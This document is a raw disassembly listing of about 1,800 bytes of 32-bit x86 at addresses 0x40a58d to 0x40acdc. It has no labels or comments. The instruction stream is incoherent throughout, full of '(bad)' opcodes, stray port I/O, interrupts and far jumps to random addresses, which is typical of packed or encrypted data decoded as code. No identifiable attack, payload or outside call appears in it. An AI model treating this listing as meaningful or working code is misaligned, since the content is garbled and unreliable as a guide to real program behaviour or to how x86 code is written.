  40a58d:	xchg   bh,dl
  40a58f:	xchg   ebx,eax
  40a590:	and    esi,edi
  40a592:	inc    ebp
  40a593:	fs aaa 
  40a595:	push   ebp
  40a596:	popf   
  40a597:	(bad)  
  40a598:	mov    BYTE PTR [edx],dh
  40a59a:	push   edx
  40a59b:	xor    ch,cl
  40a59d:	inc    esp
  40a59e:	jmp    FWORD PTR [edi]
  40a5a0:	mov    eax,gs:0x8b9cbac8
  40a5a6:	fwait
  40a5a7:	xchg   ecx,eax
  40a5a8:	cdq    
  40a5a9:	fcom   DWORD PTR [esi]
  40a5ab:	xchg   BYTE PTR [ebx-0x57397d5b],cl
  40a5b1:	jb     0x40a535
  40a5b3:	fstp   QWORD PTR [ebx-0x66]
  40a5b6:	sub    dl,0xb5
  40a5b9:	or     ch,ah
  40a5bb:	pop    ss
  40a5bc:	jae    0x40a57c
  40a5be:	(bad)  
  40a5bf:	fcmovu st,st(3)
  40a5c1:	dec    ecx
  40a5c2:	or     ebx,ecx
  40a5c4:	into   
  40a5c5:	int    0xb8
  40a5c7:	dec    DWORD PTR es:[edx-0x68a39066]
  40a5ce:	icebp  
  40a5cf:	inc    ebp
  40a5d0:	subps  xmm6,XMMWORD PTR [esi+0x3e]
  40a5d4:	mov    ecx,0xaaa701f
  40a5d9:	clc    
  40a5da:	ds pop edi
  40a5dc:	cmp    ah,bh
  40a5de:	jmp    0x6c46:0xbf2005b3
  40a5e5:	imul   edx,DWORD PTR [edx-0x532ac1f2],0x6e
  40a5ec:	jge    0x40a5fe
  40a5ee:	xchg   esi,eax
  40a5ef:	lahf   
  40a5f0:	adc    eax,0x8e37c43f
  40a5f5:	sub    al,0x4
  40a5f7:	repnz sub ebp,DWORD PTR [edi-0x28]
  40a5fb:	xor    al,BYTE PTR [esi-0x20]
  40a5fe:	outs   dx,DWORD PTR ds:[esi]
  40a5ff:	mov    dh,0x65
  40a601:	retf   0xa80b
  40a604:	and    eax,DWORD PTR [esi]
  40a606:	mov    edi,0x3cc1bfde
  40a60b:	int3   
  40a60c:	jb     0x40a64c
  40a60e:	push   ebx
  40a60f:	out    dx,al
  40a610:	jp     0x40a5ed
  40a612:	xlat   BYTE PTR ds:[ebx]
  40a613:	pushf  
  40a614:	pusha  
  40a615:	mov    cl,0x8a
  40a617:	pop    ds
  40a618:	es mov edi,0x254fd83e
  40a61e:	add    cl,al
  40a620:	and    al,0xfc
  40a622:	mov    edx,0x12da5244
  40a627:	pop    ebp
  40a628:	jns    0x40a674
  40a62a:	ja     0x40a62c
  40a62c:	fxch   st(7)
  40a62e:	test   BYTE PTR [edi-0x6b],al
  40a631:	jbe    0x40a5fe
  40a633:	inc    ebx
  40a634:	xchg   esi,eax
  40a635:	shl    BYTE PTR [ebx-0x7b],1
  40a638:	mov    eax,ds:0x21d22779
  40a63d:	inc    ebx
  40a63e:	mov    ch,0x39
  40a640:	mov    bl,0x8b
  40a642:	dec    eax
  40a643:	sub    BYTE PTR [eax+0x6cd3e7eb],0x75
  40a64a:	imul   edi,DWORD PTR [edx+0x2846f4cd],0xa3c59b49
  40a654:	retf   
  40a655:	adc    DWORD PTR [ecx],0x1d3d64da
  40a65b:	fist   DWORD PTR [esi+0x1322b7cc]
  40a661:	out    dx,eax
  40a662:	out    0x52,al
  40a664:	and    eax,0x12023bda
  40a669:	push   edi
  40a66a:	cs xchg edx,eax
  40a66c:	mov    ecx,0x9858c8e3
  40a671:	xchg   BYTE PTR [edi-0x6c],al
  40a674:	xor    dh,ah
  40a676:	cmp    dh,BYTE PTR [ebx-0x5ec24736]
  40a67c:	push   eax
  40a67d:	jmp    0xa65e:0xe37727b6
  40a684:	inc    edi
  40a685:	outs   dx,DWORD PTR ds:[esi]
  40a686:	fidiv  WORD PTR [edi+0x41]
  40a689:	sbb    DWORD PTR [esi-0x11],edx
  40a68c:	jnp    0x40a646
  40a68e:	sbb    DWORD PTR [edx+0x6d],esp
  40a691:	ins    BYTE PTR es:[edi],dx
  40a692:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a693:	outs   dx,BYTE PTR ds:[esi]
  40a694:	call   0xe9f5:0xbf47976e
  40a69b:	jg     0x40a637
  40a69d:	push   0x1723ce7b
  40a6a2:	dec    esp
  40a6a3:	and    bl,bh
  40a6a5:	cdq    
  40a6a6:	mov    eax,0xef4744b1
  40a6ab:	xchg   ecx,eax
  40a6ac:	das    
  40a6ad:	sbb    al,BYTE PTR [esi-0x5f9a63b7]
  40a6b3:	sbb    DWORD PTR [edx-0x3bf72875],eax
  40a6b9:	ds push edi
  40a6bb:	ins    DWORD PTR es:[edi],dx
  40a6bc:	repnz xor DWORD PTR [ecx+0x3c518b35],eax
  40a6c3:	ja     0x40a71e
  40a6c5:	fwait
  40a6c6:	into   
  40a6c7:	shr    edx,0xf9
  40a6ca:	xor    DWORD PTR [edx+0x63],eax
  40a6cd:	retf   
  40a6ce:	popa   
  40a6cf:	bound  edx,QWORD PTR [eax+0x49]
  40a6d2:	mov    bh,0x86
  40a6d4:	test   BYTE PTR [edx+0x442e381f],ah
  40a6da:	pop    esi
  40a6db:	call   0xfc29:0xa6f9432
  40a6e2:	pop    ebp
  40a6e3:	fild   WORD PTR [ebx]
  40a6e5:	jb     0x40a727
  40a6e7:	in     eax,0x30
  40a6e9:	xchg   ecx,eax
  40a6ea:	xor    al,0x26
  40a6ec:	dec    bl
  40a6ee:	shr    BYTE PTR [ecx+0xc],1
  40a6f1:	adc    al,BYTE PTR [eax+0x30]
  40a6f4:	imul   eax,DWORD PTR [esi+esi*2+0x69c22535],0x2d
  40a6fc:	fistp  DWORD PTR [esi]
  40a6fe:	ja     0x40a6e9
  40a700:	cmp    bh,BYTE PTR [ebp+0x1c]
  40a703:	sti    
  40a704:	lods   eax,DWORD PTR ds:[esi]
  40a705:	lahf   
  40a706:	mov    DWORD PTR [ebx+eax*4+0x53],esp
  40a70a:	fwait
  40a70b:	sub    al,0xd7
  40a70d:	mov    edi,0x25838b00
  40a712:	dec    ecx
  40a713:	xor    dl,BYTE PTR [edx]
  40a715:	jb     0x40a78f
  40a717:	(bad)  
  40a718:	push   eax
  40a719:	lds    ebx,FWORD PTR [ecx+eiz*2-0x72]
  40a71d:	and    BYTE PTR [eax-0x3d],ah
  40a720:	add    al,0x79
  40a722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a723:	sbb    DWORD PTR [esi],ebx
  40a725:	data16 mov dh,0x6
  40a728:	inc    eax
  40a729:	xor    DWORD PTR [esi-0x7f78ab3e],esp
  40a72f:	fwait
  40a730:	ja     0x40a752
  40a732:	into   
  40a733:	jmp    0x2efad699
  40a738:	test   cl,dh
  40a73a:	inc    edx
  40a73b:	mov    BYTE PTR [ebx+0x6d],0x4a
  40a73f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a740:	xchg   esi,eax
  40a741:	loope  0x40a766
  40a743:	add    dh,BYTE PTR [ebp-0x51]
  40a746:	mov    edx,edi
  40a748:	xlat   BYTE PTR ds:[ebx]
  40a749:	xchg   DWORD PTR [ebp+0x4b],ebp
  40a74c:	xchg   ebp,eax
  40a74d:	push   eax
  40a74e:	rol    DWORD PTR [ebp-0x68487491],1
  40a754:	mov    ebx,eax
  40a756:	inc    esp
  40a757:	addr16 and ecx,edi
  40a75a:	and    al,0xf5
  40a75c:	or     DWORD PTR [esi-0x3329e37],ebx
  40a762:	aas    
  40a763:	nop
  40a764:	xchg   BYTE PTR [edi+0x13],dl
  40a767:	daa    
  40a768:	push   0x6b
  40a76a:	scas   eax,DWORD PTR es:[edi]
  40a76b:	sub    BYTE PTR [ebp+0x15],ah
  40a76e:	dec    ecx
  40a76f:	mov    BYTE PTR [edi+edi*1],dl
  40a772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a773:	sti    
  40a774:	clc    
  40a775:	(bad)  
  40a776:	jmp    0x40a76c
  40a778:	cmc    
  40a779:	sar    DWORD PTR [ebx-0x1],0x91
  40a77d:	jge    0x40a7e4
  40a77f:	push   0xcd788872
  40a784:	mov    DWORD PTR [ebx+0x5],esi
  40a787:	push   esi
  40a788:	adc    eax,0x2b6a8b8e
  40a78d:	sbb    al,0x86
  40a78f:	call   0xa48b685f
  40a794:	mov    ds:0xbb8a60e,al
  40a799:	jmp    0x40a792
  40a79b:	test   eax,0x58ad49e1
  40a7a0:	push   es
  40a7a1:	lods   eax,DWORD PTR ds:[esi]
  40a7a2:	stos   DWORD PTR es:[edi],eax
  40a7a3:	mov    esi,0x11c4639f
  40a7a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7a9:	cmp    ah,BYTE PTR [eax+0x57]
  40a7ac:	push   es
  40a7ad:	loopne 0x40a766
  40a7af:	enter  0x59d8,0x1f
  40a7b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7b4:	mov    cl,0x43
  40a7b6:	xor    esi,DWORD PTR [eax-0x74]
  40a7b9:	pop    esi
  40a7ba:	(bad)  
  40a7bb:	push   edi
  40a7bc:	test   al,0x63
  40a7be:	inc    esp
  40a7bf:	pop    edx
  40a7c0:	mov    DWORD PTR [ecx+0x53],esp
  40a7c3:	add    DWORD PTR [edx-0x24dcbe22],edx
  40a7c9:	xchg   ecx,eax
  40a7ca:	leave  
  40a7cb:	ror    DWORD PTR [edi-0x1a],1
  40a7ce:	fcomp  QWORD PTR [edx]
  40a7d0:	inc    esp
  40a7d1:	dec    esi
  40a7d2:	adc    ebp,DWORD PTR [edi-0x2]
  40a7d5:	(bad)  
  40a7d6:	xchg   edi,eax
  40a7d7:	sbb    eax,0x15c9cdf4
  40a7dc:	test   al,0x19
  40a7de:	adc    eax,0xb2633f4
  40a7e3:	add    al,0xaf
  40a7e5:	mov    ebx,0x2917ba90
  40a7ea:	faddp  st(0),st
  40a7ec:	aam    0xc5
  40a7ee:	out    dx,al
  40a7ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7f0:	adc    ecx,DWORD PTR [esi+edx*2]
  40a7f3:	inc    edx
  40a7f4:	add    DWORD PTR [edx+0x23],esi
  40a7f7:	cmp    ecx,DWORD PTR [ecx+0x4736f8f]
  40a7fd:	mov    al,0x24
  40a7ff:	(bad)  
  40a800:	cwde   
  40a801:	inc    esi
  40a802:	dec    ebp
  40a803:	push   esi
  40a804:	in     al,0x4b
  40a806:	sub    al,0x3a
  40a808:	cmp    ecx,DWORD PTR [esi]
  40a80a:	dec    eax
  40a80b:	or     dl,BYTE PTR [ebp-0x774a26e6]
  40a811:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a812:	imul   ecx,DWORD PTR [ebp-0x24],0x67
  40a816:	test   al,0x44
  40a818:	rcr    BYTE PTR [eax],1
  40a81a:	dec    ebp
  40a81b:	mov    eax,ds:0x79195585
  40a820:	push   0x73
  40a822:	and    BYTE PTR [ecx+0x19],bh
  40a825:	aam    0x7d
  40a827:	dec    edx
  40a828:	clc    
  40a829:	scas   eax,DWORD PTR es:[edi]
  40a82a:	std    
  40a82b:	mov    BYTE PTR [ecx+eiz*8],dh
  40a82e:	enter  0x3edd,0x35
  40a832:	adc    edx,DWORD PTR [ebx]
  40a834:	cmp    DWORD PTR [edx-0x16],ebp
  40a837:	xor    eax,0xe6645416
  40a83c:	inc    edx
  40a83d:	pop    ds
  40a83e:	cmp    eax,0xca84039d
  40a843:	scas   eax,DWORD PTR es:[edi]
  40a844:	sti    
  40a845:	add    cl,al
  40a847:	push   ds
  40a848:	and    BYTE PTR [eax+0x1442737],dh
  40a84e:	pop    edi
  40a84f:	in     al,0xeb
  40a851:	outs   dx,DWORD PTR ds:[esi]
  40a852:	std    
  40a853:	inc    esp
  40a854:	idiv   ebp
  40a856:	call   0xa0ad:0x3e31ee94
  40a85d:	imul   eax,DWORD PTR [esi+0x6199a96e],0xaefdf24d
  40a867:	daa    
  40a868:	arpl   WORD PTR [edx+0x6a],sp
  40a86b:	pop    eax
  40a86c:	sub    al,dh
  40a86e:	leave  
  40a86f:	out    dx,al
  40a870:	loopne 0x40a8e0
  40a872:	sub    eax,DWORD PTR ds:0x1bf6
  40a877:	clc    
  40a878:	jecxz  0x40a8a0
  40a87a:	push   cs
  40a87b:	cwde   
  40a87c:	mov    edi,0x28c76f65
  40a881:	(bad)  
  40a883:	lock ins DWORD PTR es:[edi],dx
  40a885:	push   ebp
  40a886:	xor    eax,0xcc7c0c60
  40a88b:	pmaxsw mm5,mm7
  40a88e:	dec    ecx
  40a88f:	mov    ds:0xe154f11a,al
  40a894:	sub    ch,dh
  40a896:	xchg   ecx,eax
  40a897:	jl     0x40a862
  40a899:	adc    BYTE PTR [ebx-0x1e],0x4b
  40a89d:	xchg   ebx,eax
  40a89e:	mov    bl,0xa8
  40a8a0:	iret   
  40a8a1:	jbe    0x40a8a6
  40a8a3:	lock add bh,0x60
  40a8a7:	mov    ah,0x3
  40a8a9:	lea    ebp,es:[ebp+0x5b]
  40a8ad:	dec    esi
  40a8ae:	mov    esi,0x4fde5728
  40a8b3:	stos   DWORD PTR es:[edi],eax
  40a8b4:	add    ah,BYTE PTR [ebp+0x65]
  40a8b7:	enter  0x1f49,0x86
  40a8bb:	jb     0x40a869
  40a8bd:	loopne 0x40a8de
  40a8bf:	or     al,0x27
  40a8c1:	jnp    0x40a890
  40a8c3:	fidiv  WORD PTR [edi+0x2ea08923]
  40a8c9:	stc    
  40a8ca:	rcl    dh,1
  40a8cc:	pop    edi
  40a8cd:	jae    0x40a873
  40a8cf:	ins    BYTE PTR es:[edi],dx
  40a8d0:	sub    ebp,DWORD PTR [edi-0x4c]
  40a8d3:	or     eax,0x76a95188
  40a8d8:	adc    eax,edx
  40a8da:	clc    
  40a8db:	or     eax,0xd9c52f1f
  40a8e0:	(bad)  
  40a8e1:	in     eax,dx
  40a8e2:	cmp    esi,DWORD PTR [ecx+0x1d11582a]
  40a8e8:	enter  0x9592,0x2a
  40a8ec:	sbb    al,0x94
  40a8ee:	cs jge 0x40a929
  40a8f1:	push   esp
  40a8f2:	jle    0x40a8fa
  40a8f4:	mov    ds:0xb6cb7634,al
  40a8f9:	das    
  40a8fa:	(bad)  
  40a8fb:	fiadd  WORD PTR [esi-0x2e4b7bc8]
  40a901:	ret    0xb331
  40a904:	scas   eax,DWORD PTR es:[edi]
  40a905:	stc    
  40a906:	dec    esp
  40a907:	xchg   ebp,eax
  40a908:	ds push eax
  40a90a:	mov    esi,0x5770b857
  40a90f:	mov    ds:0x2cbc7d82,eax
  40a914:	out    0xc,al
  40a916:	outs   dx,DWORD PTR ds:[esi]
  40a917:	mov    BYTE PTR [ebp-0x6675c9e9],ch
  40a91d:	lds    ebx,FWORD PTR [edx-0x64754bf5]
  40a923:	aas    
  40a924:	scas   al,BYTE PTR es:[edi]
  40a925:	sbb    ah,BYTE PTR [esi+0x42e01ca]
  40a92b:	imul   eax,edi,0x10012cb3
  40a931:	xor    DWORD PTR [edx-0x26718e95],esp
  40a937:	inc    ebp
  40a938:	popf   
  40a939:	ret    0xef8e
  40a93c:	dec    esp
  40a93d:	jmp    0xe8f02f1b
  40a942:	pop    ds
  40a943:	jns    0x40a8eb
  40a945:	pop    ebp
  40a946:	ret    
  40a947:	push   ebp
  40a948:	jb     0x40a979
  40a94a:	push   ecx
  40a94b:	repz xlat BYTE PTR ds:[ebx]
  40a94d:	lock adc ch,al
  40a950:	inc    eax
  40a951:	jne    0x40a967
  40a953:	jmp    0xdb26:0xd452c828
  40a95a:	push   edi
  40a95b:	cs inc eax
  40a95d:	fcom   QWORD PTR [eax+0x47]
  40a960:	outs   dx,DWORD PTR ss:[esi]
  40a962:	jp     0x40a94e
  40a964:	mov    ah,0x79
  40a966:	jl     0x40a99d
  40a968:	mov    WORD PTR [eax+0x6c],fs
  40a96b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a96c:	popa   
  40a96d:	cs jb  0x40a9c2
  40a970:	outs   dx,DWORD PTR ds:[esi]
  40a971:	pop    esp
  40a972:	mov    cl,BYTE PTR [ebx]
  40a974:	push   cs
  40a975:	mov    bl,0x2f
  40a977:	(bad)  
  40a978:	xlat   BYTE PTR ds:[ebx]
  40a979:	std    
  40a97a:	cmp    BYTE PTR [edi],ch
  40a97c:	std    
  40a97d:	cmp    ebp,DWORD PTR [eax+eax*4]
  40a980:	and    edi,eax
  40a982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a983:	ins    DWORD PTR es:[edi],dx
  40a984:	adc    al,0xb
  40a986:	pop    esi
  40a987:	mov    al,BYTE PTR [ebx+ecx*1+0x3c]
  40a98b:	stc    
  40a98c:	imul   esp,DWORD PTR [ecx*2-0x1751dda9],0xe552beb3
  40a997:	popf   
  40a998:	sbb    BYTE PTR [edi],0x5f
  40a99b:	mov    edi,0x829e13db
  40a9a0:	xchg   esi,eax
  40a9a1:	dec    esi
  40a9a2:	xor    BYTE PTR ss:[edi-0x3ebead2b],bh
  40a9a9:	imul   ebp,ebx,0xffffff91
  40a9ac:	adc    eax,0x6c9be625
  40a9b1:	pop    esi
  40a9b2:	int    0x6d
  40a9b4:	out    0x68,al
  40a9b6:	push   ds
  40a9b7:	outs   dx,DWORD PTR ds:[esi]
  40a9b8:	pop    ss
  40a9b9:	mov    es,ebx
  40a9bb:	mov    DWORD PTR [ecx+esi*1],ebp
  40a9be:	cmp    eax,0xd802fe75
  40a9c3:	sbb    BYTE PTR [esp+ebx*8],ch
  40a9c6:	dec    DWORD PTR [ebx-0x18cf0f07]
  40a9cc:	jb     0x40a9c0
  40a9ce:	loop   0x40a975
  40a9d0:	xchg   edx,eax
  40a9d1:	aad    0xc
  40a9d3:	aaa    
  40a9d4:	aaa    
  40a9d5:	sbb    dh,dh
  40a9d7:	imul   ebp,ebp,0xa9c799fe
  40a9dd:	mov    DWORD PTR ds:0x87a1066e,ecx
  40a9e3:	sub    al,0x47
  40a9e5:	or     eax,0xd19ed17c
  40a9ea:	fist   WORD PTR [ecx-0x5996e1d6]
  40a9f0:	fisubr DWORD PTR [ecx]
  40a9f2:	push   ss
  40a9f3:	cdq    
  40a9f4:	es mov edi,0xb09bf62b
  40a9fa:	popa   
  40a9fb:	call   0x238601d
  40aa00:	xchg   edx,eax
  40aa01:	mov    ch,0xaa
  40aa03:	sbb    ecx,edx
  40aa05:	sbb    ah,BYTE PTR cs:[edx]
  40aa08:	fstp   QWORD PTR [bx-0x1481]
  40aa0d:	pop    edx
  40aa0e:	(bad)
  40aa12:	add    dl,BYTE PTR [ecx+ebx*1+0x22]
  40aa16:	test   BYTE PTR [eax+esi*8-0x3c6949de],ch
  40aa1d:	leave  
  40aa1e:	sbb    al,0xa9
  40aa20:	dec    edi
  40aa21:	arpl   dx,sp
  40aa23:	lock mov esi,DWORD PTR [ebp-0x6d]
  40aa27:	(bad)  
  40aa29:	jmp    0x2dd9e551
  40aa2e:	and    al,0x8f
  40aa30:	sub    eax,0xfc58a512
  40aa35:	mov    cl,BYTE PTR [ebp+0x7ab54fa2]
  40aa3b:	cmp    eax,0x9df26096
  40aa40:	add    eax,0x7ee0d64b
  40aa45:	ds jno 0x40a9f3
  40aa48:	pop    ss
  40aa49:	div    al
  40aa4b:	pop    ebp
  40aa4c:	test   BYTE PTR [ebp+0x414f69ad],0xa9
  40aa53:	(bad)  [ebp-0x4c]
  40aa56:	aaa    
  40aa57:	ret    0x5e4c
  40aa5a:	iret   
  40aa5b:	sbb    eax,0x221534c2
  40aa60:	sub    eax,0x863f8b46
  40aa65:	inc    ebx
  40aa66:	ds into 
  40aa68:	mov    esi,0xc5c75e7d
  40aa6d:	in     al,dx
  40aa6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa6f:	scas   al,BYTE PTR es:[edi]
  40aa70:	rol    eax,0xd0
  40aa73:	jb     0x40aae7
  40aa75:	add    ch,dh
  40aa77:	les    edx,FWORD PTR [eax+0x1761e485]
  40aa7d:	mov    ebx,0xbd356682
  40aa82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa83:	rcl    DWORD PTR [ebp+edi*8-0x408d2f4c],1
  40aa8a:	test   BYTE PTR [ecx*4-0x6b7a4369],bh
  40aa91:	cli    
  40aa92:	jmp    0x5e81:0x2c6a133f
  40aa99:	lea    edx,[esi+0x4d]
  40aa9c:	arpl   WORD PTR [edx-0x2],si
  40aa9f:	call   0x576:0x1141d0c7
  40aaa6:	icebp  
  40aaa7:	dec    esp
  40aaa8:	mov    ebp,0xb3b36f7e
  40aaad:	add    edi,ebx
  40aaaf:	call   0xdd16:0xe832a9a0
  40aab6:	mov    eax,ds:0xc6158aef
  40aabb:	popf   
  40aabc:	push   eax
  40aabd:	jp     0x40aaa1
  40aabf:	cmp    DWORD PTR [edi],edi
  40aac1:	popf   
  40aac2:	mov    dl,BYTE PTR [ecx]
  40aac4:	mov    ds,WORD PTR [esi]
  40aac6:	into   
  40aac7:	pop    edx
  40aac8:	mov    ebx,ss
  40aaca:	xchg   edi,eax
  40aacb:	out    0xe6,al
  40aacd:	push   0xfffffffd
  40aacf:	mov    ds:0x448286de,eax
  40aad4:	mov    esi,0xdc4bcfe5
  40aad9:	js     0x40ab03
  40aadb:	push   ds
  40aadc:	aas    
  40aadd:	inc    esp
  40aade:	push   0x61
  40aae0:	mov    eax,ds:0x3d0c8f0b
  40aae5:	cmp    ebp,DWORD PTR [esp+eiz*2-0x336cac9f]
  40aaec:	outs   dx,DWORD PTR ds:[esi]
  40aaed:	(bad)  
  40aaef:	jl     0x40aa8e
  40aaf1:	sar    DWORD PTR [edx],cl
  40aaf3:	push   edx
  40aaf4:	jns    0x40ab08
  40aaf6:	retf   0xeb70
  40aaf9:	shr    DWORD PTR [edi-0x7],0xa2
  40aafd:	sub    DWORD PTR [ecx-0x67],ebp
  40ab00:	pop    ebp
  40ab01:	cmp    eax,0x29beefd4
  40ab06:	or     ebp,DWORD PTR [esi+0x30]
  40ab09:	jl     0x40aafa
  40ab0b:	mov    ?,WORD PTR [ecx-0x29d21daa]
  40ab11:	out    0xda,eax
  40ab13:	and    BYTE PTR [edi-0x4f],ch
  40ab16:	loope  0x40aaec
  40ab18:	sbb    ebp,edi
  40ab1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab1b:	in     al,0x84
  40ab1d:	mov    eax,0x280d3bdd
  40ab22:	dec    eax
  40ab23:	idiv   BYTE PTR ds:0xcfbbeb00
  40ab29:	call   0x96fdec53
  40ab2e:	ds cli 
  40ab30:	mov    dl,0xf
  40ab32:	sbb    eax,0x8248dfd0
  40ab37:	push   esp
  40ab38:	icebp  
  40ab39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab3a:	call   FWORD PTR [edi+eiz*2]
  40ab3d:	inc    esi
  40ab3e:	dec    ebx
  40ab3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab40:	pop    ss
  40ab41:	mov    al,ds:0xd396ce69
  40ab46:	ficomp WORD PTR [eax+ebp*1]
  40ab49:	jno    0x40aaf5
  40ab4b:	inc    esp
  40ab4c:	cmp    dh,BYTE PTR [edx-0x3deb629e]
  40ab52:	mov    BYTE PTR [eax-0x4b],ch
  40ab55:	and    DWORD PTR [ecx],edx
  40ab57:	push   cs
  40ab58:	std    
  40ab59:	dec    eax
  40ab5a:	pop    eax
  40ab5b:	add    DWORD PTR [edi],ebx
  40ab5d:	out    0x79,al
  40ab5f:	mov    cl,0x3
  40ab61:	cwde   
  40ab62:	pop    edx
  40ab63:	dec    ebp
  40ab64:	icebp  
  40ab65:	cmp    dh,BYTE PTR [edi]
  40ab67:	sbb    al,0x4a
  40ab69:	es jmp 0xe4ce:0xefef5516
  40ab71:	ins    BYTE PTR es:[edi],dx
  40ab72:	jg     0x40ab4f
  40ab74:	mov    bh,BYTE PTR [esi-0x6dc483f2]
  40ab7a:	pop    eax
  40ab7b:	mov    al,ds:0xb66cf471
  40ab80:	or     eax,0xcf8d1b97
  40ab85:	mov    dh,0x5d
  40ab87:	shr    BYTE PTR [ebp+0x62],0x55
  40ab8b:	push   eax
  40ab8c:	in     eax,dx
  40ab8d:	sbb    bh,BYTE PTR [esi+eax*8+0x79]
  40ab91:	adc    esi,DWORD PTR [eax+0x6e]
  40ab94:	ins    DWORD PTR es:[edi],dx
  40ab95:	pop    ebp
  40ab96:	add    esp,DWORD PTR [eax-0x65]
  40ab99:	xor    ah,ch
  40ab9b:	mov    ah,BYTE PTR [ecx+0x24]
  40ab9e:	jge    0x40ab6d
  40aba0:	sub    ebp,edi
  40aba2:	daa    
  40aba3:	out    0xdb,eax
  40aba5:	in     eax,0x25
  40aba7:	lods   al,BYTE PTR ds:[esi]
  40aba8:	sub    ebp,DWORD PTR [ebx]
  40abaa:	popa   
  40abab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abac:	int    0x39
  40abae:	aad    0x59
  40abb0:	pop    edi
  40abb1:	pop    eax
  40abb2:	stos   BYTE PTR es:[edi],al
  40abb3:	in     al,0x1a
  40abb5:	mov    cl,0x84
  40abb7:	int    0x1e
  40abb9:	xor    bl,BYTE PTR [ecx-0x4c]
  40abbc:	ret    0x4146
  40abbf:	test   BYTE PTR [ebp-0x72],cl
  40abc2:	lock mov fs,ecx
  40abc5:	dec    esi
  40abc6:	test   DWORD PTR [edx],0xcadfc946
  40abcc:	push   es
  40abcd:	jb     0x40ab95
  40abcf:	mov    esi,0x49893302
  40abd4:	mov    eax,ds:0x60e1f24b
  40abd9:	add    dl,BYTE PTR [edx-0x72f69dd]
  40abdf:	mov    bl,BYTE PTR [ecx-0x3be0108f]
  40abe5:	cmp    bl,BYTE PTR [eax-0x3940ed63]
  40abeb:	or     cl,0xb0
  40abee:	jmp    0xcf942409
  40abf3:	dec    esp
  40abf4:	out    0xeb,eax
  40abf6:	cmp    DWORD PTR [edx],0xed0ce5f2
  40abfc:	fsubr  QWORD PTR [eax+0x3738f6a1]
  40ac02:	add    BYTE PTR [edi],0xe3
  40ac05:	(bad)  [ebp+0x4590e352]
  40ac0b:	lock or BYTE PTR [eax-0x65ebf7c4],ch
  40ac12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac13:	mov    DWORD PTR [eax+0xc],esp
  40ac16:	mov    ah,cl
  40ac18:	xchg   esp,eax
  40ac19:	test   DWORD PTR [ebx+0x27],0xa318109e
  40ac20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac21:	xor    DWORD PTR [ebp-0x59],0x3a6aeea2
  40ac28:	xor    al,0x37
  40ac2a:	lods   al,BYTE PTR ds:[esi]
  40ac2b:	(bad)  
  40ac2d:	jle    0x40ac52
  40ac2f:	xchg   ecx,eax
  40ac30:	xchg   ebx,eax
  40ac31:	dec    eax
  40ac32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac33:	rcr    BYTE PTR [edi],1
  40ac35:	dec    ebp
  40ac36:	das    
  40ac37:	(bad)  
  40ac38:	icebp  
  40ac39:	in     al,0xba
  40ac3b:	dec    ebx
  40ac3c:	das    
  40ac3d:	ins    BYTE PTR es:[edi],dx
  40ac3e:	mov    dh,0x68
  40ac40:	xchg   ebx,eax
  40ac41:	out    dx,eax
  40ac42:	jg     0x40acac
  40ac44:	dec    edi
  40ac45:	inc    BYTE PTR [ecx]
  40ac47:	and    BYTE PTR [eax-0x49],cl
  40ac4a:	adc    al,0x4e
  40ac4c:	cmp    ch,BYTE PTR [ecx]
  40ac4e:	xchg   DWORD PTR [eax-0x1274f700],edi
  40ac54:	mov    ds:0xe0a94228,eax
  40ac59:	aaa    
  40ac5a:	dec    eax
  40ac5b:	pop    esp
  40ac5c:	push   edi
  40ac5d:	mov    ebx,0xb44016f6
  40ac62:	ret    
  40ac63:	inc    esp
  40ac64:	lds    esp,FWORD PTR [ecx+0x20]
  40ac67:	sbb    DWORD PTR [edi],ebx
  40ac69:	out    dx,eax
  40ac6a:	pop    edx
  40ac6b:	lock mov ebp,0x49583454
  40ac71:	jge    0x40acd3
  40ac73:	add    BYTE PTR [ebp-0x54],0x14
  40ac77:	loopne 0x40aced
  40ac79:	push   edx
  40ac7a:	fdiv   st(0),st
  40ac7c:	(bad)  
  40ac7d:	push   es
  40ac7e:	fdivp  st(7),st
  40ac80:	shl    DWORD PTR [edi-0x4adf1748],0x93
  40ac87:	out    dx,al
  40ac88:	int3   
  40ac89:	fsubr  QWORD PTR [ebp+0x31]
  40ac8c:	loop   0x40ad04
  40ac8e:	imul   ebp,DWORD PTR [esi],0xc61d8018
  40ac94:	loop   0x40ac19
  40ac96:	or     al,0xce
  40ac98:	or     al,0x5f
  40ac9a:	xor    al,0x6
  40ac9c:	sub    al,0xb6
  40ac9e:	popa   
  40ac9f:	inc    edx
  40aca0:	arpl   WORD PTR [eax],di
  40aca2:	add    BYTE PTR [edx-0x3451607f],0x94
  40aca9:	ror    DWORD PTR [edx+eax*8-0xdee0546],1
  40acb0:	sub    DWORD PTR [esi],0xffffffe1
  40acb3:	mov    eax,ds:0x1bc34e73
  40acb8:	fcmovb st,st(2)
  40acba:	pop    esp
  40acbb:	fnstsw WORD PTR [ebp+0x7c87ea14]
  40acc1:	outs   dx,DWORD PTR ds:[esi]
  40acc2:	dec    ecx
  40acc3:	sub    cl,BYTE PTR [ebx+ebx*2-0x5a]
  40acc7:	sbb    eax,0xabe0a4d5
  40accc:	adc    al,0xc3
  40acce:	test   DWORD PTR [ecx],eax
  40acd0:	xchg   BYTE PTR [edi+0xa8a937b],cl
  40acd6:	cmp    BYTE PTR [esi],bh
  40acd8:	and    dh,cl
  40acda:	xchg   edx,eax
  40acdb:	push   es
  40acdc:	dec    ebp
